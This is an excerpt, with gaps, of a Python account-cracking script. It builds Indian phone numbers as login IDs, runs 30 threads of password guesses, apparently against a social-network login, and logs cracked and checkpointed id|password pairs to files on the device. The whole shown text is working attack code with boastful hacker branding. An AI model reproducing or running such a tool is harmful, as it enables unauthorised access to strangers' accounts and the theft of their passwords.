...
def india():
                user=[]
                clear()
                print('\033[1;31m Code example: 9817')
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;163mI am not a good person you think about\033[1;97m')
                        linex()
                        for psx in user:
                                ids = '+91'+code+psx
                                passlist = ['57273200',psx,code+psx]
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Mr.SPY-EXPART] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SPY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SPY-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;123m [SPY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SPY-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
